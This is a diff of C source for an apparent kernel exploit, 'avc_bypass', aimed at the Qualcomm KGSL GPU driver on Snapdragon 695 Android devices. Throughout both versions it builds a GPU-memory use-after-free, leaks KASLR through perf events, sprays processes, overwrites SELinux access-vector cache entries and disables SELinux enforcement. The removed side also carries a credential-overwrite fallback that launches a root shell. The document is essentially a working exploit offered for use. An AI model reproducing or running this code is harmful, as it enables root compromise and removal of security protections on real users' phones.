@@ -76,61 +76,29 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 
 #define UAF_ADDR  0x7001ff000ULL
 #define UAF_SIZE  0x10004000ULL
-#define OVERLAP_ADDR 0x7001fe000ULL
-#define OVERLAP_SIZE 0x7000ULL
-#define BOGUS_ADDR 0x700204000ULL
-#define BOGUS_SIZE 0xffffffffffefd000ULL
-#define PLACEHOLDER_ADDR 0x710204000ULL
-#define PLACEHOLDER_SIZE 0x10400000ULL
-
 #define AVC_ENFORCE_PATH "/sys/fs/selinux/enforce"
+#define AVC_NODE_STRIDE  72
 #define SPRAY_PIDS 2000
-#define CHURN_MAX_PATHS 20000
-#define OVERLAP_COUNT 200
 
 #define VMLINUX_TEXT 0xffffffc010080000ULL
 #define VMLINUX_INIT_CRED_OFFSET 0x26fa738
 
 static int kgsl_fd = -1;
-static volatile int race_done = 0;
-static uint64_t alloc_flags = 0;
-static int uaf_id = -1;
 static void *uaf_map = NULL;
+static int uaf_id = -1;
+static uint64_t alloc_flags = 0;
 
 static void die(const char *msg) { perror(msg); exit(1); }
-
-static uint32_t pm4_parity(uint32_t v) {
-    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
-}
-
-static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
-    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
-}
-#define CP_NOP 0x10
-#define CP_MEM_WRITE 0x3D
-#define CP_MEM_TO_MEM 0x73
-
-static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
-    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
-}
 
 static int gpuobj_alloc(uint64_t size, uint64_t flags) {
     struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
     if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
     return a.id;
 }
-
 static void gpuobj_free(unsigned int id) {
     struct kgsl_gpuobj_free f = { .id = id };
     if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
 }
-
-static void *gpuobj_mmap(size_t size, unsigned int id) {
-    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
-    if (p == MAP_FAILED) die("gpuobj_mmap");
-    return p;
-}
-
 static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
     struct kgsl_gpuobj_info inf = { .id = id };
     int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
@@ -138,222 +106,9 @@ static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
     return ret;
 }
 
-static unsigned int create_context(void) {
-    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
-    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
-    return c.drawctxt_id;
-}
-
-static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
-    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
-    for (int i = 0; i < 100000; i++) {
-        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
-        if (r.timestamp >= target) return 0;
-        usleep(100);
-    }
-    return -2;
-}
-
-static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
-    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
-    struct kgsl_command_object cmd_obj = {
-        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
-        .flags = KGSL_CMDLIST_IB, .id = ib_id
-    };
-    struct kgsl_gpu_command gc = {0};
-    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
-    gc.cmdsize = sizeof(cmd_obj);
-    gc.numcmds = 1;
-    gc.context_id = ctx_id;
-    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
-    if (out_ts) *out_ts = gc.timestamp;
-    return ret;
-}
-
-static void phase1_rbtree(void) {
-    alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
-    uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
-    uaf_map = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
-        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
-    if (uaf_map == MAP_FAILED) die("mmap UAF");
-
-    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
-        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");
-
-    int ph_id = gpuobj_alloc(PLACEHOLDER_SIZE, alloc_flags);
-    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
-        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
-    if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");
-
-    printf("  UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
-        (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
-        (unsigned long)PLACEHOLDER_ADDR);
-}
-
-static void *race_thread(void *arg) {
-    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
-    struct kgsl_gpuobj_import imp = {
-        .priv = (uint64_t)&uaddr, .priv_len = BOGUS_SIZE,
-        .flags = KGSL_MEMFLAGS_USE_CPU_MAP, .type = KGSL_USER_MEM_TYPE_ADDR,
-    };
-    while (!race_done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
-    return NULL;
-}
-
-static int phase2_race(void) {
-    int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
-    pthread_t thr;
-    if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");
-
-    int hit = 0;
-    for (int i = 0; i < 5000000; i++) {
-        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
-            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
-            kgsl_fd, (off_t)ov_id << 12);
-        int e = errno;
-        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
-        if (e == ENODEV) { hit = 1; break; }
-        if (i % 500000 == 0) printf("  race %d/5000000 errno=%d\n", i, e);
-    }
-
-    race_done = 1;
-    pthread_join(thr, NULL);
-    if (!hit) { printf("[-] Race failed\n"); return 0; }
-    printf("[+] Race won!\n");
-    return 1;
-}
-
-static void phase3_free_uaf(void) {
-    gpuobj_free(uaf_id);
-    printf("[+] UAF freed (dangling PTEs at 0x%lx+)\n", (unsigned long)(UAF_ADDR + 0x1000));
-}
-
-static void phase4_reclaim(void) {
-    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
-    if (rf >= 0) { write(rf, "1", 1); close(rf); }
-    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
-    if (rf >= 0) { write(rf, "3", 1); close(rf); }
-    usleep(10000);
-}
-
-static const char *churn_dirs[] = {
-    "/sys/kernel", "/sys/devices", "/sys/module", "/sys/class",
-    "/proc/sys", "/proc/irq", "/proc/1", "/proc/2", "/proc/3",
-    "/dev/block", "/dev/gpu", "/data/system", "/data/misc",
-    "/data/vendor", "/vendor/etc", "/apex", "/system/bin",
-    "/system/lib64", "/data/data", "/data/app", "/data/user/0",
-    "/dev", "/proc",
-};
-
-static char churn_paths[CHURN_MAX_PATHS][160];
-static int churn_npaths = 0;
-static int churn_built = 0;
-
-static void churn_walk(const char *dir, int depth) {
-    if (depth > 5 || churn_npaths >= CHURN_MAX_PATHS) return;
-    DIR *d = opendir(dir);
-    if (!d) return;
-    struct dirent *de;
-    while ((de = readdir(d)) != NULL && churn_npaths < CHURN_MAX_PATHS) {
-        if (de->d_name[0] == '.') continue;
-        char p[192];
-        snprintf(p, sizeof(p), "%s/%s", dir, de->d_name);
-        int fd = open(p, O_RDONLY | O_CLOEXEC);
-        if (fd >= 0) close(fd);
-        churn_npaths++;
-        churn_walk(p, depth + 1);
-    }
-    closedir(d);
-}
-
-static void churn_build(void) {
-    if (churn_built) return;
-    for (unsigned d = 0; d < sizeof(churn_dirs)/sizeof(churn_dirs[0]) &&
-         churn_npaths < CHURN_MAX_PATHS; d++) {
-        churn_walk(churn_dirs[d], 0);
-    }
-    churn_built = 1;
-    printf("[CHURN] %d paths\n", churn_npaths);
-}
-
-static void churn_round_intensive(void) {
-    churn_build();
-    for (int i = 0; i < churn_npaths; i++) {
-        int fd = open(churn_paths[i], O_RDONLY | O_CLOEXEC);
-        if (fd >= 0) close(fd);
-        struct stat st;
-        stat(churn_paths[i], &st);
-        access(churn_paths[i], R_OK);
-    }
-    char fake_path[256];
-    for (int i = 0; i < 10000; i++) {
-        snprintf(fake_path, sizeof(fake_path), "/proc/self/fd/%d", i);
-        int fd = open(fake_path, O_RDONLY);
-        if (fd >= 0) close(fd);
-        snprintf(fake_path, sizeof(fake_path), "/sys/kernel/security/%d", i);
-        fd = open(fake_path, O_RDONLY);
-        if (fd >= 0) close(fd);
-    }
-    int s = socket(AF_INET, SOCK_STREAM, 0);
-    if (s >= 0) { close(s); }
-    s = socket(AF_UNIX, SOCK_STREAM, 0);
-    if (s >= 0) {
-        struct sockaddr_un su = { .sun_family = AF_UNIX };
-        strcpy(su.sun_path, "/data/local/tmp/cs.sock");
-        bind(s, (struct sockaddr *)&su, sizeof(su));
-        close(s);
-        unlink("/data/local/tmp/cs.sock");
-    }
-    msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
-    semget(IPC_PRIVATE, 1, 0600 | IPC_CREAT);
-    shmget(IPC_PRIVATE, 4096, 0600 | IPC_CREAT);
-    mknod("/data/local/tmp/cn", S_IFCHR | 0600, makedev(1, 3));
-    for (int i = 0; i < 100; i++) {
-        int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
-        if (fd >= 0) { write(fd, "1", 1); close(fd); }
-        usleep(50);
-    }
-}
-
-static int try_setenforce0(void) {
-    int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
-    if (fd < 0) return 0;
-    ssize_t w = write(fd, "0", 1);
-    close(fd);
-    return (w == 1);
-}
-
-static pid_t spray_pids[SPRAY_PIDS];
-static int n_spray = 0;
-
-static void spawn_spray(void) {
-    printf("[SPRAY] spawning...\n");
-    for (int i = 0; i < SPRAY_PIDS; i++) {
-        pid_t p = fork();
-        if (p == 0) {
-            prctl(PR_SET_NAME, "TASKUAF!!");
-            for (;;) usleep(200000);
-        }
-        if (p > 0) spray_pids[n_spray++] = p;
-        else break;
-    }
-    printf("[SPRAY] %d children\n", n_spray);
-}
-
-static void kill_spray_children(void) {
-    int killed = 0;
-    for (int i = 0; i < n_spray; i++) {
-        kill(spray_pids[i], SIGKILL);
-        killed++;
-    }
-    while (waitpid(-1, NULL, 0) > 0) ;
-    printf("[KILL] %d spray children killed+reaped\n", killed);
-}
-
 static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
     return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
 }
-
 static uint64_t detect_kaslr(void) {
     struct perf_event_attr pe = {0};
     pe.type = PERF_TYPE_HARDWARE;
@@ -399,159 +154,235 @@ static uint64_t detect_kaslr(void) {
     return (first_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
 }
 
-static void cred_overwrite_method(uint64_t init_cred_addr) {
-    printf("[*] Fallback: cred overwrite method\n");
-    uint64_t alloc_flags_no_cpu = KGSL_CACHEMODE_WRITEBACK;
-    void *small_maps[OVERLAP_COUNT];
-    int small_ids[OVERLAP_COUNT];
-    int success = 0;
+static int try_setenforce0(void) {
+    int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
+    if (fd < 0) return 0;
+    ssize_t w = write(fd, "0", 1);
+    close(fd);
+    return (w == 1);
+}
 
-    for (int i = 0; i < OVERLAP_COUNT; i++) {
-        int id = gpuobj_alloc(0x1000, alloc_flags_no_cpu);
-        if (id < 0) continue;
-        void *map = gpuobj_mmap(0x1000, id);
-        if (map == MAP_FAILED) { gpuobj_free(id); continue; }
-        small_ids[success] = id;
-        small_maps[success] = map;
-        success++;
-        if (success >= OVERLAP_COUNT) break;
+/* ========== チャーン ========== */
+#define CHURN_MAX_PATHS 20000
+static char churn_paths[CHURN_MAX_PATHS][160];
+static int churn_npaths = 0;
+static int churn_built = 0;
+
+static const char *churn_dirs[] = {
+    "/sys/kernel", "/sys/devices", "/sys/module", "/sys/class",
+    "/proc/sys", "/proc/irq", "/proc/1", "/proc/2", "/proc/3",
+    "/dev/block", "/dev/gpu", "/data/system", "/data/misc",
+    "/data/vendor", "/vendor/etc", "/apex", "/system/bin",
+    "/system/lib64", "/data/data", "/data/app", "/data/user/0",
+    "/dev", "/proc",
+};
+
+static void churn_walk(const char *dir, int depth) {
+    if (depth > 5 || churn_npaths >= CHURN_MAX_PATHS) return;
+    DIR *d = opendir(dir);
+    if (!d) return;
+    struct dirent *de;
+    while ((de = readdir(d)) != NULL && churn_npaths < CHURN_MAX_PATHS) {
+        if (de->d_name[0] == '.') continue;
+        char p[192];
+        snprintf(p, sizeof(p), "%s/%s", dir, de->d_name);
+        int fd = open(p, O_RDONLY | O_CLOEXEC);
+        if (fd >= 0) close(fd);
+        churn_npaths++;
+        churn_walk(p, depth + 1);
     }
-    printf("[+] Mapped %d small objects\n", success);
-    if (success == 0) return;
+    closedir(d);
+}
 
-    for (int i = 0; i < success; i++) {
-        uint64_t *ptr = (uint64_t *)small_maps[i];
-        for (uint64_t off = 0x500; off < 0xA00; off += 8) {
-            ptr[off/8] = init_cred_addr;
-        }
+static void churn_build(void) {
+    if (churn_built) return;
+    for (unsigned d = 0; d < sizeof(churn_dirs)/sizeof(churn_dirs[0]) &&
+         churn_npaths < CHURN_MAX_PATHS; d++) {
+        churn_walk(churn_dirs[d], 0);
     }
-    __sync_synchronize();
+    churn_built = 1;
+    printf("[CHURN] %d paths\n", churn_npaths);
+}
 
-    int pipefd[2];
-    if (pipe(pipefd) < 0) { perror("pipe"); return; }
-    fcntl(pipefd[0], F_SETFD, FD_CLOEXEC);
-    fcntl(pipefd[1], F_SETFD, FD_CLOEXEC);
+static void churn_round(void) {
+    churn_build();
+    for (int i = 0; i < churn_npaths; i++) {
+        int fd = open(churn_paths[i], O_RDONLY | O_CLOEXEC);
+        if (fd >= 0) close(fd);
+    }
+    int s = socket(AF_INET, SOCK_STREAM, 0);
+    if (s >= 0) { close(s); }
+    s = socket(AF_UNIX, SOCK_STREAM, 0);
+    if (s >= 0) {
+        struct sockaddr_un su = { .sun_family = AF_UNIX };
+        strcpy(su.sun_path, "/data/local/tmp/cs.sock");
+        bind(s, (struct sockaddr *)&su, sizeof(su));
+        close(s);
+        unlink("/data/local/tmp/cs.sock");
+    }
+    msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
+    semget(IPC_PRIVATE, 1, 0600 | IPC_CREAT);
+    shmget(IPC_PRIVATE, 4096, 0600 | IPC_CREAT);
+    mknod("/data/local/tmp/cn", S_IFCHR | 0600, makedev(1, 3));
+}
 
-    pid_t pids[SPRAY_PIDS];
-    int n = 0;
+/* ========== 子プロセススプレー ========== */
+static pid_t spray_pids[SPRAY_PIDS];
+static int n_spray = 0;
+
+static void spawn_spray(void) {
+    printf("[SPRAY] spawning...\n");
     for (int i = 0; i < SPRAY_PIDS; i++) {
         pid_t p = fork();
         if (p == 0) {
-            prctl(PR_SET_NAME, "UAF_TASK");
-            for (int j = 0; j < 600; j++) {
-                if (getuid() == 0) {
-                    write(pipefd[1], &p, sizeof(p));
-                    execl("/system/bin/sh", "sh", NULL);
-                    _exit(0);
-                }
-                usleep(100000);
-            }
-            _exit(0);
-        } else if (p > 0) {
-            pids[n++] = p;
+            prctl(PR_SET_NAME, "TASKUAF!!");
+            for (;;) usleep(200000);
         }
+        if (p > 0) spray_pids[n_spray++] = p;
+        else break;
     }
-    close(pipefd[1]);
-
-    struct pollfd pfd = { .fd = pipefd[0], .events = POLLIN };
-    pid_t winner = 0;
-    if (poll(&pfd, 1, 30000) > 0 && read(pipefd[0], &winner, sizeof(winner)) == sizeof(winner)) {
-        printf("[+] ROOT! PID=%d\n", winner);
-        for (int i = 0; i < n; i++) if (pids[i] != winner) kill(pids[i], SIGKILL);
-        waitpid(winner, NULL, 0);
-    } else {
-        printf("[-] No root\n");
-    }
-    close(pipefd[0]);
-    for (int i = 0; i < success; i++) {
-        munmap(small_maps[i], 0x1000);
-        gpuobj_free(small_ids[i]);
-    }
+    printf("[SPRAY] %d children\n", n_spray);
 }
 
-static void root_shell(void) {
-    printf("\n  # ROOT SHELL (uid=0) - type exit to quit\n  # ");
-    fflush(stdout);
-    char buf[512];
-    while (fgets(buf, sizeof(buf), stdin) != NULL) {
-        if (strncmp(buf, "exit", 4) == 0 || strncmp(buf, "quit", 4) == 0) break;
-        buf[strcspn(buf, "\n")] = 0;
-        if (buf[0] == 0) continue;
-        int st = system(buf);
-        (void)st;
-        printf("# ");
-        fflush(stdout);
+static void kill_spray_children(void) {
+    int killed = 0;
+    for (int i = 0; i < n_spray; i++) {
+        kill(spray_pids[i], SIGKILL);
+        killed++;
     }
-    printf("[-] Root shell exited\n");
+    while (waitpid(-1, NULL, 0) > 0) ;
+    printf("[KILL] %d spray children killed+reaped\n", killed);
+}
+
+/* ========== CPUマッピングを使った task_struct スキャン（読み出し代替） ========== */
+static int scan_task_pages_cpu(void *base, uint64_t size, uint64_t *out_pages, int maxout) {
+    uint32_t *p = (uint32_t *)base;
+    uint32_t num_dwords = size / 4;
+    int found = 0;
+    for (uint32_t i = 0; i + 1 < num_dwords && found < maxout; i++) {
+        if (p[i] == 0x4B534154 && p[i+1] == 0x21464155) { // "TASKUAF!!"
+            uint64_t va = (uint64_t)(uintptr_t)(p + i);
+            va &= ~0xFFFULL; // ページアライン
+            out_pages[found++] = va;
+            printf("[TASKPG] va=0x%lx\n", va);
+            i += 0x1000 / 4; // 次のページへ
+        }
+    }
+    return found;
+}
+
+/* ========== CPUマッピングを使った AVC ノードスキャン＆書き換え ========== */
+static int scan_flip_avc_cpu(void *base, uint64_t size) {
+    uint32_t *p = (uint32_t *)base;
+    uint32_t num_dwords = size / 4;
+    int flips = 0;
+    for (uint32_t i = 0; i + 3 < num_dwords; i += AVC_NODE_STRIDE / 4) {
+        uint32_t sid = p[i];
+        uint32_t tsid = p[i+1];
+        uint32_t tclass = p[i+2];
+        if (sid >= 1 && sid <= 0x3fff && tsid == 2 && tclass == 1) {
+            p[i+3] = 0xFFFFFFFF;
+            flips++;
+            printf("[FLIP] va=0x%lx sid=%u tsid=%u tclass=%u allowed->0xffffffff\n",
+                   (unsigned long)(base + i * 4), sid, tsid, tclass);
+        }
+    }
+    return flips;
 }
 
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
-    bool want_shell = false;
-    for (int i = 1; i < argc; i++)
-        if (strcmp(argv[i], "-i") == 0) want_shell = true;
-
-    printf("[*] avc_bypass v3: uid=%d euid=%d\n", getuid(), geteuid());
-
-    uint64_t kaslr = detect_kaslr();
-    if (!kaslr) { printf("[-] KASLR detection failed\n"); return 1; }
-    uint64_t init_cred_addr = kaslr + VMLINUX_INIT_CRED_OFFSET;
-    printf("[+] KASLR=0x%lx init_cred=0x%lx\n", kaslr, init_cred_addr);
+    printf("[*] avc_bypass (CPU mapping UAF) for Snapdragon 695\n");
 
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) die("open kgsl");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
 
-    printf("[*] Phase 1: Setup rbtree\n");
-    phase1_rbtree();
+    uint64_t kaslr = detect_kaslr();
+    if (!kaslr) {
+        printf("[-] KASLR detection failed\n");
+        close(kgsl_fd);
+        return 1;
+    }
+    printf("[+] KASLR = 0x%lx\n", kaslr);
+    uint64_t init_cred_addr = kaslr + VMLINUX_INIT_CRED_OFFSET;
+    printf("[*] init_cred = 0x%lx (for reference)\n", init_cred_addr);
 
-    printf("[*] Phase 2: Race\n");
-    if (!phase2_race()) { close(kgsl_fd); return 1; }
+    alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
 
-    printf("[*] Phase 3: Free UAF\n");
-    phase3_free_uaf();
+    /* Phase 1: Allocate large UAF object and mmap it */
+    printf("[*] Phase 1: Allocate large UAF object and mmap\n");
+    uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
+    uint64_t uaf_gpuaddr = 0;
+    gpuobj_info(uaf_id, &uaf_gpuaddr);
+    printf("[+] UAF id=%d gpuaddr=0x%lx\n", uaf_id, uaf_gpuaddr);
 
-    printf("[*] Phase 4: Reclaim\n");
-    phase4_reclaim();
+    uaf_map = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
+                   MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
+    if (uaf_map == MAP_FAILED) die("mmap UAF");
+    printf("[+] mmap at %p\n", uaf_map);
 
+    /* Phase 2: Free the object (UAF) */
+    printf("[*] Phase 2: Free UAF object\n");
+    gpuobj_free(uaf_id);
+    printf("[+] Freed\n");
+
+    /* Phase 3: Reclaim memory */
+    printf("[*] Phase 3: Reclaim memory\n");
+    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
+    if (rf >= 0) { write(rf, "1", 1); close(rf); }
+    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
+    if (rf >= 0) { write(rf, "3", 1); close(rf); }
+    usleep(10000);
+
+    /* Phase 4: Spray task_struct */
     spawn_spray();
+
+    /* Phase 5: Scan UAF mapping for task_struct pages (using CPU) */
+    printf("[*] Phase 5: Scan UAF area for task_struct pages\n");
+    uint64_t task_pages[4096];
+    int n_task = scan_task_pages_cpu(uaf_map, UAF_SIZE, task_pages, 4096);
+    printf("[*] Found %d task pages\n", n_task);
+    if (n_task == 0) {
+        printf("[-] No task_struct pages found. Exiting.\n");
+        kill_spray_children();
+        close(kgsl_fd);
+        return 1;
+    }
+
+    /* Phase 6: Kill spray children to free pages */
     kill_spray_children();
     usleep(100000);
 
-    printf("[*] Phase 5: Intensive churn to allocate AVC nodes\n");
-    for (int c = 0; c < 5; c++) churn_round_intensive();
+    /* Phase 7: Churn to allocate avc_nodes in the freed pages */
+    printf("[*] Phase 7: Churn to allocate avc_nodes\n");
+    churn_build();
+    for (int c = 0; c < 5; c++) churn_round();
 
-    printf("[*] Phase 6: Scan UAF region via CPU mapping for avc_node\n");
+    /* Phase 8: Scan and flip avc_nodes via CPU mapping */
+    printf("[*] Phase 8: Scan and flip avc_nodes\n");
     int flips = 0;
-    uint32_t *p = (uint32_t *)uaf_map;
-    for (size_t i = 0; i + 3 < UAF_SIZE/4; i += 72/4) {
-        if (p[i] >= 1 && p[i] <= 0x3fff && p[i+1] == 2 && p[i+2] == 1) {
-            p[i+3] = 0xFFFFFFFF;
-            flips++;
-        }
+    for (int i = 0; i < n_task && i < 128; i++) {
+        uint64_t page_va = task_pages[i];
+        uint64_t offset = page_va - UAF_ADDR;
+        if (offset + 0x1000 > UAF_SIZE) continue;
+        void *page_ptr = uaf_map + offset;
+        flips += scan_flip_avc_cpu(page_ptr, 0x1000);
     }
-    printf("[*] Flips: %d\n", flips);
+    printf("[*] Total flips: %d\n", flips);
 
-    int ok = 0;
-    if (flips > 0) {
-        __sync_synchronize();
-        ok = try_setenforce0();
-        if (!ok) {
-            sleep(1);
-            ok = try_setenforce0();
-        }
-    }
-
+    /* Phase 9: Try setenforce 0 */
+    printf("[*] Phase 9: Trying setenforce 0\n");
+    int ok = try_setenforce0();
     if (!ok) {
-        printf("[!] AVC flip failed, falling back to cred overwrite\n");
-        cred_overwrite_method(init_cred_addr);
+        sleep(1);
         ok = try_setenforce0();
     }
 
     if (ok) {
         printf("[+] ### SETENFORCE 0 SUCCEEDED — SELinux permissive ###\n");
     } else {
-        printf("[-] All methods failed\n");
+        printf("[-] SELinux still enforcing\n");
     }
 
     int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
@@ -561,6 +392,7 @@ int main(int argc, char **argv) {
         if (n > 0) { v[n] = 0; printf("[*] getenforce: %s\n", v); }
     }
 
-    if (want_shell && getuid() == 0) root_shell();
+    munmap(uaf_map, UAF_SIZE);
+    close(kgsl_fd);
     return ok ? 0 : 1;
 }
